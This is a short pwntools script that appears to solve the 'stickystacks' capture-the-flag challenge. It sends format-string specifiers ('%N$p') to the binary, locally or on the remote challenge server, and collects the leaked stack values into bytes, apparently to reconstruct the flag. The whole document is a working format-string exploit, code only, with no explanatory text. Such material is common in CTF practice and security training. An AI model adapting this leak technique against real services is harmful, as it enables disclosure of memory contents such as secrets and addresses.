from pwn import *
from time import sleep

e = ELF("./stickystacks")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)


ret = ""
for i in range(1, 100, 1):
  if is_remote:
    p = remote("shell.actf.co", 21820)
  else:
    p = process(e.path)
    #, env={"LD_PRELOAD": libc.path})
  
  p.sendlineafter(":", "%" + str(i) + "$p")
  p.recvuntil(", ")

  leek = p.recvline()

  if "nil" not in leek:
    ret += p64(int(leek[len("0x"):], 16))

  p.close()

print(ret)


sleep(10)
